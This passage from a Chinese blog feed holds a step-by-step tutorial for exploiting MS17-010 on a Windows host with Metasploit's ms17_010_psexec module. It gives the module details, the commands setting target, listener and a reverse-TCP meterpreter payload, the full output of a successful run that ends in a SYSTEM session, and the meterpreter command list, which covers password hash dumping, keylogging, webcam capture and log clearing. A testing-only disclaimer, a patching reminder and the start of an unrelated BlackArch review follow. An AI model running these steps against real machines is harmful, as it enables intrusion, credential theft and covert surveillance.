</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class="line"><span class="cl">     Module: exploit/windows/smb/ms17_010_psexec
</span></span><span class="line"><span class="cl">   Platform: Windows
</span></span><span class="line"><span class="cl">       Arch: x86, x64
</span></span><span class="line"><span class="cl"> Privileged: No
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">  Disclosed: 2017-03-14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  sleepya
</span></span><span class="line"><span class="cl">  zerosum0x0
</span></span><span class="line"><span class="cl">  Shadow Brokers
</span></span><span class="line"><span class="cl">  Equation Group
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Available targets:
</span></span><span class="line"><span class="cl">  Id  Name
</span></span><span class="line"><span class="cl">  --  ----
</span></span><span class="line"><span class="cl">  0   Automatic
</span></span><span class="line"><span class="cl">  1   PowerShell
</span></span><span class="line"><span class="cl">  2   Native upload
</span></span><span class="line"><span class="cl">  3   MOF upload
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name                  Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----                  ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  DBGTRACE              false                                           yes       Show extra debug trace info
</span></span><span class="line"><span class="cl">  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
</span></span><span class="line"><span class="cl">  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
</span></span><span class="line"><span class="cl">  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                                yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT                 445                                             yes       The Target port
</span></span><span class="line"><span class="cl">  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
</span></span><span class="line"><span class="cl">  SERVICE_DISPLAY_NAME                                                  no        The service display name
</span></span><span class="line"><span class="cl">  SERVICE_NAME                                                          no        The service name
</span></span><span class="line"><span class="cl">  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span></span><span class="line"><span class="cl">  SMBDomain             .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                               no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                               no        The username to authenticate as
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload information:
</span></span><span class="line"><span class="cl">  Space: 3072
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  This module will exploit SMB with vulnerabilities in MS17-010 to 
</span></span><span class="line"><span class="cl">  achieve a write-what-where primitive. This will then be used to 
</span></span><span class="line"><span class="cl">  overwrite the connection session information with as an 
</span></span><span class="line"><span class="cl">  Administrator session. From there, the normal psexec payload code 
</span></span><span class="line"><span class="cl">  execution is done. Exploits a type confusion between Transaction and 
</span></span><span class="line"><span class="cl">  WriteAndX requests and a race condition in Transaction requests, as 
</span></span><span class="line"><span class="cl">  seen in the EternalRomance, EternalChampion, and EternalSynergy 
</span></span><span class="line"><span class="cl">  exploits. This exploit chain is more reliable than the EternalBlue 
</span></span><span class="line"><span class="cl">  exploit, but requires a named pipe.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://github.com/worawit/MS17-010
</span></span><span class="line"><span class="cl">  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
</span></span><span class="line"><span class="cl">  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  ETERNALSYNERGY
</span></span><span class="line"><span class="cl">  ETERNALROMANCE
</span></span><span class="line"><span class="cl">  ETERNALCHAMPION
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西</p>
<ul>
<li>RHOST，目标IP，目标的DHCP地址</li>
<li>LHOST，监听IP，一般是你自己的DHCP地址</li>
<li>LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。</li>
<li>payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。</li>
</ul>
<p>接下来就设置这四个东西吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 192.168.42.141
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">6666</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 192.168.42.252
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> payloads windows/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置完以后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> ，其实二者并没有什么区别，都是一样的。</p>
<p>喜欢哪个就用哪个吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.42.141:6666 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Target OS: Windows 5.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Filling barrel with fish... <span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Entering Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>*<span class="o">]</span> Preparing dynamite...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 		<span class="o">[</span>*<span class="o">]</span> Trying stick <span class="m">1</span> <span class="o">(</span>x86<span class="o">)</span>...Boom!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully Leaked Transaction!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - 	<span class="o">[</span>+<span class="o">]</span> Successfully caught Fish-in-a-barrel
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - &lt;---------------- <span class="p">|</span> Leaving Danger Zone <span class="p">|</span> ----------------&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Reading from CONNECTION struct at: 0x81382010
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Built a write-what-where primitive...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Overwrite complete... SYSTEM session obtained!
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Selecting native target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Uploading payload... JmgBrDpV.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Created <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445 - Service started successfully...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445 - Deleting <span class="se">\J</span>mgBrDpV.exe...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">179779</span> bytes<span class="o">)</span> to 192.168.42.252
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.42.141:6666 -&gt; 192.168.42.252:1027<span class="o">)</span> at 2019-07-26 23:11:38 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>截一张图吧

接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。</p>
<p>那么至少可以干点什么呢，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; <span class="nb">help</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就可以看到帮助文档了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Core Commands
</span></span><span class="line"><span class="cl">=============
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command                   Description
</span></span><span class="line"><span class="cl">    -------                   -----------
</span></span><span class="line"><span class="cl">    ?                         Help menu
</span></span><span class="line"><span class="cl">    background                Backgrounds the current session
</span></span><span class="line"><span class="cl">    bg                        Alias for background
</span></span><span class="line"><span class="cl">    bgkill                    Kills a background meterpreter script
</span></span><span class="line"><span class="cl">    bglist                    Lists running background scripts
</span></span><span class="line"><span class="cl">    bgrun                     Executes a meterpreter script as a background thread
</span></span><span class="line"><span class="cl">    channel                   Displays information or control active channels
</span></span><span class="line"><span class="cl">    close                     Closes a channel
</span></span><span class="line"><span class="cl">    disable_unicode_encoding  Disables encoding of unicode strings
</span></span><span class="line"><span class="cl">    enable_unicode_encoding   Enables encoding of unicode strings
</span></span><span class="line"><span class="cl">    exit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    get_timeouts              Get the current session timeout values
</span></span><span class="line"><span class="cl">    guid                      Get the session GUID
</span></span><span class="line"><span class="cl">    help                      Help menu
</span></span><span class="line"><span class="cl">    info                      Displays information about a Post module
</span></span><span class="line"><span class="cl">    irb                       Open an interactive Ruby shell on the current session
</span></span><span class="line"><span class="cl">    load                      Load one or more meterpreter extensions
</span></span><span class="line"><span class="cl">    machine_id                Get the MSF ID of the machine attached to the session
</span></span><span class="line"><span class="cl">    migrate                   Migrate the server to another process
</span></span><span class="line"><span class="cl">    pivot                     Manage pivot listeners
</span></span><span class="line"><span class="cl">    pry                       Open the Pry debugger on the current session
</span></span><span class="line"><span class="cl">    quit                      Terminate the meterpreter session
</span></span><span class="line"><span class="cl">    read                      Reads data from a channel
</span></span><span class="line"><span class="cl">    resource                  Run the commands stored in a file
</span></span><span class="line"><span class="cl">    run                       Executes a meterpreter script or Post module
</span></span><span class="line"><span class="cl">    sessions                  Quickly switch to another session
</span></span><span class="line"><span class="cl">    set_timeouts              Set the current session timeout values
</span></span><span class="line"><span class="cl">    sleep                     Force Meterpreter to go quiet, then re-establish session.
</span></span><span class="line"><span class="cl">    transport                 Change the current transport mechanism
</span></span><span class="line"><span class="cl">    use                       Deprecated alias for &#34;load&#34;
</span></span><span class="line"><span class="cl">    uuid                      Get the UUID for the current session
</span></span><span class="line"><span class="cl">    write                     Writes data to a channel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: File system Commands
</span></span><span class="line"><span class="cl">============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    cat           Read the contents of a file to the screen
</span></span><span class="line"><span class="cl">    cd            Change directory
</span></span><span class="line"><span class="cl">    checksum      Retrieve the checksum of a file
</span></span><span class="line"><span class="cl">    cp            Copy source to destination
</span></span><span class="line"><span class="cl">    dir           List files (alias for ls)
</span></span><span class="line"><span class="cl">    download      Download a file or directory
</span></span><span class="line"><span class="cl">    edit          Edit a file
</span></span><span class="line"><span class="cl">    getlwd        Print local working directory
</span></span><span class="line"><span class="cl">    getwd         Print working directory
</span></span><span class="line"><span class="cl">    lcd           Change local working directory
</span></span><span class="line"><span class="cl">    lls           List local files
</span></span><span class="line"><span class="cl">    lpwd          Print local working directory
</span></span><span class="line"><span class="cl">    ls            List files
</span></span><span class="line"><span class="cl">    mkdir         Make directory
</span></span><span class="line"><span class="cl">    mv            Move source to destination
</span></span><span class="line"><span class="cl">    pwd           Print working directory
</span></span><span class="line"><span class="cl">    rm            Delete the specified file
</span></span><span class="line"><span class="cl">    rmdir         Remove directory
</span></span><span class="line"><span class="cl">    search        Search for files
</span></span><span class="line"><span class="cl">    show_mount    List all mount points/logical drives
</span></span><span class="line"><span class="cl">    upload        Upload a file or directory
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Networking Commands
</span></span><span class="line"><span class="cl">===========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    arp           Display the host ARP cache
</span></span><span class="line"><span class="cl">    getproxy      Display the current proxy configuration
</span></span><span class="line"><span class="cl">    ifconfig      Display interfaces
</span></span><span class="line"><span class="cl">    ipconfig      Display interfaces
</span></span><span class="line"><span class="cl">    netstat       Display the network connections
</span></span><span class="line"><span class="cl">    portfwd       Forward a local port to a remote service
</span></span><span class="line"><span class="cl">    resolve       Resolve a set of host names on the target
</span></span><span class="line"><span class="cl">    route         View and modify the routing table
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: System Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    clearev       Clear the event log
</span></span><span class="line"><span class="cl">    drop_token    Relinquishes any active impersonation token.
</span></span><span class="line"><span class="cl">    execute       Execute a command
</span></span><span class="line"><span class="cl">    getenv        Get one or more environment variable values
</span></span><span class="line"><span class="cl">    getpid        Get the current process identifier
</span></span><span class="line"><span class="cl">    getprivs      Attempt to enable all privileges available to the current process
</span></span><span class="line"><span class="cl">    getsid        Get the SID of the user that the server is running as
</span></span><span class="line"><span class="cl">    getuid        Get the user that the server is running as
</span></span><span class="line"><span class="cl">    kill          Terminate a process
</span></span><span class="line"><span class="cl">    localtime     Displays the target system&#39;s local date and time
</span></span><span class="line"><span class="cl">    pgrep         Filter processes by name
</span></span><span class="line"><span class="cl">    pkill         Terminate processes by name
</span></span><span class="line"><span class="cl">    ps            List running processes
</span></span><span class="line"><span class="cl">    reboot        Reboots the remote computer
</span></span><span class="line"><span class="cl">    reg           Modify and interact with the remote registry
</span></span><span class="line"><span class="cl">    rev2self      Calls RevertToSelf() on the remote machine
</span></span><span class="line"><span class="cl">    shell         Drop into a system command shell
</span></span><span class="line"><span class="cl">    shutdown      Shuts down the remote computer
</span></span><span class="line"><span class="cl">    steal_token   Attempts to steal an impersonation token from the target process
</span></span><span class="line"><span class="cl">    suspend       Suspends or resumes a list of processes
</span></span><span class="line"><span class="cl">    sysinfo       Gets information about the remote system, such as OS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: User interface Commands
</span></span><span class="line"><span class="cl">===============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    enumdesktops   List all accessible desktops and window stations
</span></span><span class="line"><span class="cl">    getdesktop     Get the current meterpreter desktop
</span></span><span class="line"><span class="cl">    idletime       Returns the number of seconds the remote user has been idle
</span></span><span class="line"><span class="cl">    keyboard_send  Send keystrokes
</span></span><span class="line"><span class="cl">    keyscan_dump   Dump the keystroke buffer
</span></span><span class="line"><span class="cl">    keyscan_start  Start capturing keystrokes
</span></span><span class="line"><span class="cl">    keyscan_stop   Stop capturing keystrokes
</span></span><span class="line"><span class="cl">    mouse          Send mouse events
</span></span><span class="line"><span class="cl">    screenshot     Grab a screenshot of the interactive desktop
</span></span><span class="line"><span class="cl">    setdesktop     Change the meterpreters current desktop
</span></span><span class="line"><span class="cl">    uictl          Control some of the user interface components
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Webcam Commands
</span></span><span class="line"><span class="cl">=======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command        Description
</span></span><span class="line"><span class="cl">    -------        -----------
</span></span><span class="line"><span class="cl">    record_mic     Record audio from the default microphone for X seconds
</span></span><span class="line"><span class="cl">    webcam_chat    Start a video chat
</span></span><span class="line"><span class="cl">    webcam_list    List webcams
</span></span><span class="line"><span class="cl">    webcam_snap    Take a snapshot from the specified webcam
</span></span><span class="line"><span class="cl">    webcam_stream  Play a video stream from the specified webcam
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Stdapi: Audio Output Commands
</span></span><span class="line"><span class="cl">=============================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    play          play an audio file on target system, nothing written on disk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Elevate Commands
</span></span><span class="line"><span class="cl">======================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    getsystem     Attempt to elevate your privilege to that of local system.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Password database Commands
</span></span><span class="line"><span class="cl">================================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    hashdump      Dumps the contents of the SAM database
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Priv: Timestomp Commands
</span></span><span class="line"><span class="cl">========================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Command       Description
</span></span><span class="line"><span class="cl">    -------       -----------
</span></span><span class="line"><span class="cl">    timestomp     Manipulate file MACE attributes
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，返回来的很多是吧，这几个比较常用</p>
<p><strong><code>cd</code></strong>、<strong><code>ls</code></strong>、<strong><code>shell</code></strong>、<strong><code>cat</code></strong></p>
<p>懂Linux的人基本上都知道了，这里不多做解释了。</p>
<h2 id="小结">小结</h2>
<p>首先本篇博客仅作为测试用途，请勿将其用于违法用途。</p>
<p>其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。</p>
<p>然后这篇博客也带有很多水的成分，谢谢浏览。</p>
]]></description>
</item><item>
    <title>关于BlackArch的体验报告</title>
    <link>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</link>
    <pubDate>Sun, 16 Jun 2019 16:33:47 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/ba-slider.png" referrerpolicy="no-referrer">
            </div><blockquote>
<p><em>今天我尝试装了一下black Arch，花了很长时间，之后发现这个系统并不是很完美。</em></p>
</blockquote>
<h2 id="优点">优点</h2>
<p>首先说说它的优点:</p>
<ul>
<li>这玩意集成了几千个软件包，并且都是一些很厉害的工具</li>
<li>其次这玩意很酷，特别是壁纸，配色什么的，我都觉得特别炫酷</li>
<li>以及它安装的便捷性，我一开始以为它比Arch难安装，其实用完才知道这个安装简直比Arch简单十倍，只不过我习惯了Arch那种手动式，这种半自动化却不习惯了</li>
</ul>
